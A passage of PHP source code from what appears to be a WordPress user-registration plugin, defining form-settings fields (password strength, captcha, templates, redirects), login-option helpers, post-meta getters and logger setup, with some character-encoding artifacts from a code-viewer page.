| [999](#L999) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_minimum\_password\_strength', |
| [1000](#L1000) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1001](#L1001) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1002](#L1002) | 'options'Â  Â  Â  Â  Â  Â =>Â array( |
| [1003](#L1003) | '0'Â =>Â \_\_(Â 'Very Weak',Â 'user-registration'Â ), |
| [1004](#L1004) | '1'Â =>Â \_\_(Â 'Weak',Â 'user-registration'Â ), |
| [1005](#L1005) | '2'Â =>Â \_\_(Â 'Medium',Â 'user-registration'Â ), |
| [1006](#L1006) | '3'Â =>Â \_\_(Â 'Strong',Â 'user-registration'Â ), |
| [1007](#L1007) | ), |
| [1008](#L1008) | 'custom\_attributes'Â =>Â array(), |
| [1009](#L1009) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_minimum\_password\_strength',Â get\_option(Â 'user\_registration\_form\_setting\_minimum\_password\_strength',Â '3'Â )Â ), |
| [1010](#L1010) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Set minimum required password strength.',Â 'user-registration'Â ), |
| [1011](#L1011) | ), |
| [1012](#L1012) | array( |
| [1013](#L1013) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'text', |
| [1014](#L1014) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Submit Button Class',Â 'user-registration'Â ), |
| [1015](#L1015) | 'description'Â  Â  Â  Â =>Â '', |
| [1016](#L1016) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1017](#L1017) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_form\_submit\_class', |
| [1018](#L1018) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1019](#L1019) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1020](#L1020) | 'custom\_attributes'Â =>Â array(), |
| [1021](#L1021) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_form\_submit\_class',Â ''Â ), |
| [1022](#L1022) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Enter CSS class names for the Submit Button. Multiple class names should be separated with spaces.',Â 'user-registration'Â ), |
| [1023](#L1023) | ), |
| [1024](#L1024) | array( |
| [1025](#L1025) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'text', |
| [1026](#L1026) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Submit Button Text',Â 'user-registration'Â ), |
| [1027](#L1027) | 'description'Â  Â  Â  Â =>Â '', |
| [1028](#L1028) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1029](#L1029) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_form\_submit\_label', |
| [1030](#L1030) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1031](#L1031) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1032](#L1032) | 'custom\_attributes'Â =>Â array(), |
| [1033](#L1033) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_form\_submit\_label',Â 'Submit'Â ), |
| [1034](#L1034) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Enter desired text for the Submit Button.',Â 'user-registration'Â ), |
| [1035](#L1035) | ), |
| [1036](#L1036) | array( |
| [1037](#L1037) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'select', |
| [1038](#L1038) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Success message position',Â 'user-registration'Â ), |
| [1039](#L1039) | 'description'Â  Â  Â  Â =>Â '', |
| [1040](#L1040) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1041](#L1041) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_success\_message\_position', |
| [1042](#L1042) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1043](#L1043) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1044](#L1044) | 'options'Â  Â  Â  Â  Â  Â =>Â array( |
| [1045](#L1045) | '0'Â =>Â \_\_(Â 'Top',Â 'user-registration'Â ), |
| [1046](#L1046) | '1'Â =>Â \_\_(Â 'Bottom',Â 'user-registration'Â ), |
| [1047](#L1047) | ), |
| [1048](#L1048) | 'custom\_attributes'Â =>Â array(), |
| [1049](#L1049) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_success\_message\_position',Â '1'Â ), |
| [1050](#L1050) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Display success message either at the top or bottom after successful registration.',Â 'user-registration'Â ), |
| [1051](#L1051) | ), |
| [1052](#L1052) | array( |
| [1053](#L1053) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'toggle', |
| [1054](#L1054) |  |
| [1055](#L1055) | /\* translators: 1: Link tag open 2:: Link content 3:: Link tag close \*/ |
| [1056](#L1056) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â sprintf(Â \_\_(Â 'Enable &nbsp; %1$s %2$s Captcha %3$s &nbsp; Support',Â 'user-registration'Â ),Â '<a title="',Â 'Please make sure the site key and secret are not empty in setting page." href="'Â .Â admin\_url()Â .Â 'admin.php?page=user-registration-settings&tab=captcha" target="\_blank">',Â '</a>'Â ), |
| [1057](#L1057) | 'description'Â  Â  Â  Â =>Â '', |
| [1058](#L1058) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1059](#L1059) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_enable\_recaptcha\_support', |
| [1060](#L1060) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1061](#L1061) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1062](#L1062) | 'custom\_attributes'Â =>Â array(), |
| [1063](#L1063) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_string\_to\_bool(Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_enable\_recaptcha\_support',Â falseÂ )Â ), |
| [1064](#L1064) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Enable Captcha for strong security from spams and bots.',Â 'user-registration'Â ), |
| [1065](#L1065) | ), |
| [1066](#L1066) | array( |
| [1067](#L1067) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'select', |
| [1068](#L1068) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Form Template',Â 'user-registration'Â ), |
| [1069](#L1069) | 'description'Â  Â  Â  Â =>Â '', |
| [1070](#L1070) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1071](#L1071) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_template', |
| [1072](#L1072) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1073](#L1073) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1074](#L1074) | 'options'Â  Â  Â  Â  Â  Â =>Â array( |
| [1075](#L1075) | 'Default'Â  Â  Â  =>Â \_\_(Â 'Default',Â 'user-registration'Â ), |
| [1076](#L1076) | 'Bordered'Â  Â  Â =>Â \_\_(Â 'Bordered',Â 'user-registration'Â ), |
| [1077](#L1077) | 'Flat'Â  Â  Â  Â  Â =>Â \_\_(Â 'Flat',Â 'user-registration'Â ), |
| [1078](#L1078) | 'Rounded'Â  Â  Â  =>Â \_\_(Â 'Rounded',Â 'user-registration'Â ), |
| [1079](#L1079) | 'Rounded Edge'Â =>Â \_\_(Â 'Rounded Edge',Â 'user-registration'Â ), |
| [1080](#L1080) | ), |
| [1081](#L1081) | 'custom\_attributes'Â =>Â array(), |
| [1082](#L1082) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_template',Â ucwords(Â str\_replace(Â '\_',Â ' ',Â get\_option(Â 'user\_registration\_form\_template',Â 'default'Â )Â )Â )Â ), |
| [1083](#L1083) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Choose form template to use.',Â 'user-registration'Â ), |
| [1084](#L1084) | ), |
| [1085](#L1085) | array( |
| [1086](#L1086) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'text', |
| [1087](#L1087) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Form Class',Â 'user-registration'Â ), |
| [1088](#L1088) | 'description'Â  Â  Â  Â =>Â '', |
| [1089](#L1089) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1090](#L1090) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_custom\_class', |
| [1091](#L1091) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1092](#L1092) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1093](#L1093) | 'custom\_attributes'Â =>Â array(), |
| [1094](#L1094) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_custom\_class'Â ), |
| [1095](#L1095) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Enter CSS class names for the Form Wrapper. Multiple class names should be separated with spaces.',Â 'user-registration'Â ), |
| [1096](#L1096) | ), |
| [1097](#L1097) | array( |
| [1098](#L1098) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'select', |
| [1099](#L1099) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Redirect After Registration',Â 'user-registration'Â ), |
| [1100](#L1100) | 'description'Â  Â  Â  Â =>Â '', |
| [1101](#L1101) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1102](#L1102) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_redirect\_after\_registration', |
| [1103](#L1103) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1104](#L1104) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1105](#L1105) | 'options'Â  Â  Â  Â  Â  Â =>Â apply\_filters( |
| [1106](#L1106) | 'user\_registration\_redirect\_after\_registration\_options', |
| [1107](#L1107) | array( |
| [1108](#L1108) | 'no-redirection'Â =>Â \_\_(Â 'No Redirection',Â 'user-registration'Â ), |
| [1109](#L1109) | 'internal-page'Â  =>Â \_\_(Â 'Internal Page',Â 'user-registration'Â ), |
| [1110](#L1110) | 'external-url'Â  Â =>Â \_\_(Â 'External URL',Â 'user-registration'Â ), |
| [1111](#L1111) | ) |
| [1112](#L1112) | ), |
| [1113](#L1113) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_redirect\_after\_registration',Â 'no-redirection'Â ), |
| [1114](#L1114) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Choose where to redirect the user after successful registration.',Â 'user-registration'Â ), |
| [1115](#L1115) | 'custom\_attributes'Â =>Â array(), |
| [1116](#L1116) | ), |
| [1117](#L1117) | array( |
| [1118](#L1118) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'select', |
| [1119](#L1119) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Custom Page',Â 'user-registration'Â ), |
| [1120](#L1120) | 'description'Â  Â  Â  Â =>Â '', |
| [1121](#L1121) | 'required'Â  Â  Â  Â  Â  =>Â false, |
| [1122](#L1122) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_redirect\_page', |
| [1123](#L1123) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1124](#L1124) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1125](#L1125) | 'options'Â  Â  Â  Â  Â  Â =>Â ur\_get\_all\_pages(), |
| [1126](#L1126) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_redirect\_page',Â ''Â ), |
| [1127](#L1127) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Choose the custom page to redirect after registration',Â 'user-registration'Â ), |
| [1128](#L1128) | 'custom\_attributes'Â =>Â array(), |
| [1129](#L1129) | ), |
| [1130](#L1130) | array( |
| [1131](#L1131) | 'type'Â  Â  Â  Â  Â  Â  Â  =>Â 'text', |
| [1132](#L1132) | 'label'Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'Redirect URL',Â 'user-registration'Â ), |
| [1133](#L1133) | 'id'Â  Â  Â  Â  Â  Â  Â  Â  =>Â 'user\_registration\_form\_setting\_redirect\_options', |
| [1134](#L1134) | 'class'Â  Â  Â  Â  Â  Â  Â =>Â array(Â 'ur-enhanced-select'Â ), |
| [1135](#L1135) | 'input\_class'Â  Â  Â  Â =>Â array(), |
| [1136](#L1136) | 'custom\_attributes'Â =>Â array(), |
| [1137](#L1137) | 'default'Â  Â  Â  Â  Â  Â =>Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_redirect\_options',Â get\_option(Â 'user\_registration\_general\_setting\_redirect\_options',Â ''Â )Â ),Â  // Getting redirect options from global settings for backward compatibility. |
| [1138](#L1138) | 'tip'Â  Â  Â  Â  Â  Â  Â  Â =>Â \_\_(Â 'This option lets you enter redirect path after successful user registration.',Â 'user-registration'Â ), |
| [1139](#L1139) | ), |
| [1140](#L1140) | ), |
| [1141](#L1141) | ); |
| [1142](#L1142) |  |
| [1143](#L1143) | $argumentsÂ =Â apply\_filters(Â 'user\_registration\_get\_form\_settings',Â $argumentsÂ ); |
| [1144](#L1144) |  |
| [1145](#L1145) | returnÂ $arguments['setting\_data']; |
| [1146](#L1146) | } |
| [1147](#L1147) |  |
| [1148](#L1148) | /\*\* |
| [1149](#L1149) | \* User Login Option |
| [1150](#L1150) | \* |
| [1151](#L1151) | \* @return array |
| [1152](#L1152) | \*/ |
| [1153](#L1153) | functionÂ ur\_login\_option()Â { |
| [1154](#L1154) |  |
| [1155](#L1155) | returnÂ apply\_filters( |
| [1156](#L1156) | 'user\_registration\_login\_options', |
| [1157](#L1157) | array( |
| [1158](#L1158) | 'default'Â  Â  Â  Â  Â  Â  =>Â \_\_(Â 'Auto approval and manual login',Â 'user-registration'Â ), |
| [1159](#L1159) | 'auto\_login'Â  Â  Â  Â  Â =>Â \_\_(Â 'Auto approval and auto login ',Â 'user-registration'Â ), |
| [1160](#L1160) | 'admin\_approval'Â  Â  Â =>Â \_\_(Â 'Admin approval',Â 'user-registration'Â ), |
| [1161](#L1161) | 'email\_confirmation'Â =>Â \_\_(Â 'Auto approval after email confirmation',Â 'user-registration'Â ), |
| [1162](#L1162) | ) |
| [1163](#L1163) | ); |
| [1164](#L1164) | } |
| [1165](#L1165) |  |
| [1166](#L1166) | /\*\* |
| [1167](#L1167) | \* User Login Option |
| [1168](#L1168) | \* |
| [1169](#L1169) | \* @return array |
| [1170](#L1170) | \*/ |
| [1171](#L1171) | functionÂ ur\_login\_option\_with()Â { |
| [1172](#L1172) |  |
| [1173](#L1173) | returnÂ apply\_filters( |
| [1174](#L1174) | 'user\_registration\_login\_options\_with', |
| [1175](#L1175) | array( |
| [1176](#L1176) | 'default'Â  =>Â \_\_(Â 'Username or Email',Â 'user-registration'Â ), |
| [1177](#L1177) | 'username'Â =>Â \_\_(Â 'Username',Â 'user-registration'Â ), |
| [1178](#L1178) | 'email'Â  Â  =>Â \_\_(Â 'Email',Â 'user-registration'Â ), |
| [1179](#L1179) | ) |
| [1180](#L1180) | ); |
| [1181](#L1181) | } |
| [1182](#L1182) |  |
| [1183](#L1183) | /\*\* |
| [1184](#L1184) | \* Get Default value for Enable Email Approval Checkbox |
| [1185](#L1185) | \* |
| [1186](#L1186) | \* @param int $form\_id Form ID. |
| [1187](#L1187) | \*/ |
| [1188](#L1188) | functionÂ ur\_get\_approval\_default(Â $form\_idÂ )Â { |
| [1189](#L1189) | ifÂ (Â isset(Â $form\_idÂ )Â &&Â 0Â !=Â absint(Â $form\_idÂ )Â )Â { |
| [1190](#L1190) | $valueÂ =Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_enable\_email\_approval'Â ); |
| [1191](#L1191) | }Â elseÂ { |
| [1192](#L1192) | $valueÂ =Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_enable\_email\_approval',Â get\_option(Â 'user\_registration\_login\_option\_enable\_email\_approval',Â falseÂ )Â ); |
| [1193](#L1193) | } |
| [1194](#L1194) | $valueÂ =Â ur\_string\_to\_bool(Â $valueÂ )Â ?Â trueÂ :Â false; |
| [1195](#L1195) |  |
| [1196](#L1196) | returnÂ $value; |
| [1197](#L1197) | } |
| [1198](#L1198) |  |
| [1199](#L1199) | /\*\* |
| [1200](#L1200) | \* Get Post meta value by meta key. |
| [1201](#L1201) | \* |
| [1202](#L1202) | \* @param intÂ  Â  $post\_id Post ID. |
| [1203](#L1203) | \* @param string $meta\_key Meta Key. |
| [1204](#L1204) | \* @param mixedÂ  $default Default Value. |
| [1205](#L1205) | \* |
| [1206](#L1206) | \* @since 1.0.1 |
| [1207](#L1207) | \* |
| [1208](#L1208) | \* @return mixed |
| [1209](#L1209) | \*/ |
| [1210](#L1210) | functionÂ ur\_get\_single\_post\_meta(Â $post\_id,Â $meta\_key,Â $defaultÂ =Â nullÂ )Â { |
| [1211](#L1211) |  |
| [1212](#L1212) | $post\_metaÂ =Â get\_post\_meta(Â $post\_id,Â $meta\_keyÂ ); |
| [1213](#L1213) |  |
| [1214](#L1214) | ifÂ (Â isset(Â $post\_meta[0]Â )Â )Â { |
| [1215](#L1215) | ifÂ (Â 'user\_registration\_form\_setting\_enable\_recaptcha\_support'Â ===Â $meta\_keyÂ ||Â 'user\_registration\_form\_setting\_enable\_strong\_password'Â ===Â $meta\_key |
| [1216](#L1216) | ||Â 'user\_registration\_pdf\_submission\_to\_admin'Â ===Â $meta\_keyÂ ||Â 'user\_registration\_pdf\_submission\_to\_user'Â ===Â $meta\_keyÂ ||Â 'user\_registration\_form\_setting\_enable\_assign\_user\_role\_conditionally'Â ===Â $meta\_keyÂ )Â { |
| [1217](#L1217) | $post\_meta[0]Â =Â ur\_string\_to\_bool(Â $post\_meta[0]Â ); |
| [1218](#L1218) | } |
| [1219](#L1219) | returnÂ $post\_meta[0]; |
| [1220](#L1220) | } |
| [1221](#L1221) |  |
| [1222](#L1222) | returnÂ $default; |
| [1223](#L1223) | } |
| [1224](#L1224) |  |
| [1225](#L1225) | /\*\* |
| [1226](#L1226) | \* Get general form settings by meta key (settings id). |
| [1227](#L1227) | \* |
| [1228](#L1228) | \* @param intÂ  Â  $form\_id Form ID. |
| [1229](#L1229) | \* @param string $meta\_key Meta Key. |
| [1230](#L1230) | \* @param mixedÂ  $default Default Value. |
| [1231](#L1231) | \* |
| [1232](#L1232) | \* @since 1.0.1 |
| [1233](#L1233) | \* |
| [1234](#L1234) | \* @return mixed |
| [1235](#L1235) | \*/ |
| [1236](#L1236) | functionÂ ur\_get\_form\_setting\_by\_key(Â $form\_id,Â $meta\_key,Â $defaultÂ =Â ''Â )Â { |
| [1237](#L1237) |  |
| [1238](#L1238) | $fieldsÂ =Â ur\_admin\_form\_settings\_fields(Â $form\_idÂ ); |
| [1239](#L1239) | $valueÂ  =Â ''; |
| [1240](#L1240) |  |
| [1241](#L1241) | foreachÂ (Â $fieldsÂ asÂ $fieldÂ )Â { |
| [1242](#L1242) |  |
| [1243](#L1243) | ifÂ (Â isset(Â $field['id']Â )Â &&Â $meta\_keyÂ ==Â $field['id']Â )Â { |
| [1244](#L1244) | $valueÂ =Â isset(Â $field['default']Â )Â ?Â sanitize\_text\_field(Â $field['default']Â )Â :Â $default; |
| [1245](#L1245) | break; |
| [1246](#L1246) | } |
| [1247](#L1247) | } |
| [1248](#L1248) |  |
| [1249](#L1249) | returnÂ $value; |
| [1250](#L1250) | } |
| [1251](#L1251) |  |
| [1252](#L1252) | /\*\* |
| [1253](#L1253) | \* Get user status in case of admin approval login option |
| [1254](#L1254) | \* |
| [1255](#L1255) | \* @param int $user\_id User ID. |
| [1256](#L1256) | \* @return int |
| [1257](#L1257) | \*/ |
| [1258](#L1258) | functionÂ ur\_get\_user\_approval\_status(Â $user\_idÂ )Â { |
| [1259](#L1259) |  |
| [1260](#L1260) | $user\_statusÂ =Â 1; |
| [1261](#L1261) |  |
| [1262](#L1262) | $form\_idÂ =Â ur\_get\_form\_id\_by\_userid(Â $user\_idÂ ); |
| [1263](#L1263) |  |
| [1264](#L1264) | $login\_optionÂ =Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_form\_setting\_login\_options',Â get\_option(Â 'user\_registration\_general\_setting\_login\_options',Â 'default'Â )Â ); |
| [1265](#L1265) |  |
| [1266](#L1266) | ifÂ (Â 'admin\_approval'Â ===Â $login\_optionÂ )Â { |
| [1267](#L1267) |  |
| [1268](#L1268) | $user\_statusÂ =Â get\_user\_meta(Â $user\_id,Â 'ur\_user\_status',Â trueÂ ); |
| [1269](#L1269) | } |
| [1270](#L1270) |  |
| [1271](#L1271) | returnÂ $user\_status; |
| [1272](#L1272) | } |
| [1273](#L1273) |  |
| [1274](#L1274) | /\*\* |
| [1275](#L1275) | \* Get form data by field key. |
| [1276](#L1276) | \* |
| [1277](#L1277) | \* @param arrayÂ  $form\_data Form Data. |
| [1278](#L1278) | \* @param string $key Field Key. |
| [1279](#L1279) | \* |
| [1280](#L1280) | \* @return array |
| [1281](#L1281) | \*/ |
| [1282](#L1282) | functionÂ ur\_get\_form\_data\_by\_key(Â $form\_data,Â $keyÂ =Â nullÂ )Â { |
| [1283](#L1283) |  |
| [1284](#L1284) | $form\_data\_arrayÂ =Â array(); |
| [1285](#L1285) |  |
| [1286](#L1286) | foreachÂ (Â $form\_dataÂ asÂ $dataÂ )Â { |
| [1287](#L1287) | foreachÂ (Â $dataÂ asÂ $single\_dataÂ )Â { |
| [1288](#L1288) | foreachÂ (Â $single\_dataÂ asÂ $field\_dataÂ )Â { |
| [1289](#L1289) |  |
| [1290](#L1290) | $field\_keyÂ =Â isset(Â $field\_data->field\_keyÂ )Â &&Â nullÂ !==Â $field\_data->field\_keyÂ ?Â $field\_data->field\_keyÂ :Â ''; |
| [1291](#L1291) |  |
| [1292](#L1292) | ifÂ (Â !Â empty(Â $field\_keyÂ )Â )Â { |
| [1293](#L1293) | $field\_nameÂ =Â isset(Â $field\_data->general\_setting->field\_nameÂ )Â &&Â nullÂ !==Â $field\_data->general\_setting->field\_nameÂ ?Â $field\_data->general\_setting->field\_nameÂ :Â ''; |
| [1294](#L1294) |  |
| [1295](#L1295) | ifÂ (Â nullÂ ===Â $keyÂ )Â { |
| [1296](#L1296) |  |
| [1297](#L1297) | ifÂ (Â !Â empty(Â $field\_nameÂ )Â )Â { |
| [1298](#L1298) | $form\_data\_array[Â $field\_nameÂ ]Â =Â $field\_data; |
| [1299](#L1299) | }Â elseÂ { |
| [1300](#L1300) | $form\_data\_array[]Â =Â $field\_data; |
| [1301](#L1301) | } |
| [1302](#L1302) | }Â elseÂ { |
| [1303](#L1303) |  |
| [1304](#L1304) | ifÂ (Â $field\_keyÂ ===Â $keyÂ )Â { |
| [1305](#L1305) |  |
| [1306](#L1306) | ifÂ (Â !Â empty(Â $field\_nameÂ )Â )Â { |
| [1307](#L1307) | $form\_data\_array[Â $field\_nameÂ ]Â =Â $field\_data; |
| [1308](#L1308) | }Â elseÂ { |
| [1309](#L1309) | $form\_data\_array[]Â =Â $field\_data; |
| [1310](#L1310) | } |
| [1311](#L1311) | } |
| [1312](#L1312) | } |
| [1313](#L1313) | } |
| [1314](#L1314) | } |
| [1315](#L1315) | } |
| [1316](#L1316) | } |
| [1317](#L1317) |  |
| [1318](#L1318) | returnÂ $form\_data\_array; |
| [1319](#L1319) | } |
| [1320](#L1320) |  |
| [1321](#L1321) | /\*\* |
| [1322](#L1322) | \* Get a log file path. |
| [1323](#L1323) | \* |
| [1324](#L1324) | \* @since 1.0.5 |
| [1325](#L1325) | \* |
| [1326](#L1326) | \* @param string $handle name. |
| [1327](#L1327) | \* |
| [1328](#L1328) | \* @return string the log file path. |
| [1329](#L1329) | \*/ |
| [1330](#L1330) | functionÂ ur\_get\_log\_file\_path(Â $handleÂ )Â { |
| [1331](#L1331) | returnÂ UR\_Log\_Handler\_File::get\_log\_file\_path(Â $handleÂ ); |
| [1332](#L1332) | } |
| [1333](#L1333) |  |
| [1334](#L1334) | /\*\* |
| [1335](#L1335) | \* Registers the default log handler. |
| [1336](#L1336) | \* |
| [1337](#L1337) | \* @since 1.0.5 |
| [1338](#L1338) | \* |
| [1339](#L1339) | \* @param array $handlers Log handlers. |
| [1340](#L1340) | \* |
| [1341](#L1341) | \* @return array |
| [1342](#L1342) | \*/ |
| [1343](#L1343) | functionÂ ur\_register\_default\_log\_handler(Â $handlersÂ )Â { |
| [1344](#L1344) |  |
| [1345](#L1345) | ifÂ (Â defined(Â 'UR\_LOG\_HANDLER'Â )Â &&Â class\_exists(Â UR\_LOG\_HANDLERÂ )Â )Â { |
| [1346](#L1346) | $handler\_classÂ  Â =Â UR\_LOG\_HANDLER; |
| [1347](#L1347) | $default\_handlerÂ =Â newÂ $handler\_class(); |
| [1348](#L1348) | }Â elseÂ { |
| [1349](#L1349) | $default\_handlerÂ =Â newÂ UR\_Log\_Handler\_File(); |
| [1350](#L1350) | } |
| [1351](#L1351) |  |
| [1352](#L1352) | array\_push(Â $handlers,Â $default\_handlerÂ ); |
| [1353](#L1353) |  |
| [1354](#L1354) | returnÂ $handlers; |
| [1355](#L1355) | } |
| [1356](#L1356) |  |
| [1357](#L1357) | add\_filter(Â 'user\_registration\_register\_log\_handlers',Â 'ur\_register\_default\_log\_handler'Â ); |
| [1358](#L1358) |  |
| [1359](#L1359) |  |
| [1360](#L1360) | /\*\* |
| [1361](#L1361) | \* Get a shared logger instance. |
| [1362](#L1362) | \* |
| [1363](#L1363) | \* Use the user\_registration\_logging\_class filter to change the logging class. You may provide one of the following: |
| [1364](#L1364) | \*Â  Â  Â - a class name which will be instantiated as `new $class` with no arguments |
| [1365](#L1365) | \*Â  Â  Â - an instance which will be used directly as the logger |
| [1366](#L1366) | \* In either case, the class or instance \*must\* implement UR\_Logger\_Interface. |
| [1367](#L1367) | \* |
| [1368](#L1368) | \* @see UR\_Logger\_Interface |
| [1369](#L1369) | \* @since 1.1.0 |
| [1370](#L1370) | \* @return UR\_Logger |
| [1371](#L1371) | \*/ |
| [1372](#L1372) | functionÂ ur\_get\_logger()Â { |
| [1373](#L1373) | staticÂ $loggerÂ =Â null; |
| [1374](#L1374) | ifÂ (Â nullÂ ===Â $loggerÂ )Â { |
| [1375](#L1375) | $classÂ  Â  Â  =Â apply\_filters(Â 'user\_registration\_logging\_class',Â 'UR\_Logger'Â ); |
| [1376](#L1376) | $implementsÂ =Â class\_implements(Â $classÂ ); |
| [1377](#L1377) | ifÂ (Â is\_array(Â $implementsÂ )Â &&Â in\_array(Â 'UR\_Logger\_Interface',Â $implementsÂ )Â )Â { |
| [1378](#L1378) | ifÂ (Â is\_object(Â $classÂ )Â )Â { |
| [1379](#L1379) | $loggerÂ =Â $class; |
| [1380](#L1380) | }Â elseÂ { |
| [1381](#L1381) | $loggerÂ =Â newÂ $class(); |
| [1382](#L1382) | } |
| [1383](#L1383) | }Â elseÂ { |
| [1384](#L1384) | ur\_doing\_it\_wrong( |
| [1385](#L1385) | \_\_FUNCTION\_\_, |
| [1386](#L1386) | sprintf( |
| [1387](#L1387) | /\* translators: %s: Class \*/ |
| [1388](#L1388) | \_\_(Â 'The class <code>%s</code> provided by user\_registration\_logging\_class filter must implement <code>UR\_Logger\_Interface</code>.',Â 'user-registration'Â ), |
| [1389](#L1389) | esc\_html(Â is\_object(Â $classÂ )Â ?Â get\_class(Â $classÂ )Â :Â $classÂ ) |
| [1390](#L1390) | ), |
| [1391](#L1391) | '1.0.5' |
| [1392](#L1392) | ); |
| [1393](#L1393) | $loggerÂ =Â newÂ UR\_Logger(); |
| [1394](#L1394) | } |
| [1395](#L1395) | } |
| [1396](#L1396) |  |
| [1397](#L1397) | returnÂ $logger; |
| [1398](#L1398) | } |
| [1399](#L1399) |  |
| [1400](#L1400) | /\*\* |
| [1401](#L1401) | \* Handles addon plugin updater. |
| [1402](#L1402) | \* |
| [1403](#L1403) | \* @param string $file Plugin File. |
| [1404](#L1404) | \* @param intÂ  Â  $item\_id Item ID. |
| [1405](#L1405) | \* @param string $addon\_version Addon Version. |
| [1406](#L1406) | \* @param boolÂ  Â $beta Is beta version. |
| [1407](#L1407) | \* |
| [1408](#L1408) | \* @since 1.1.0 |
| [1409](#L1409) | \*/ |
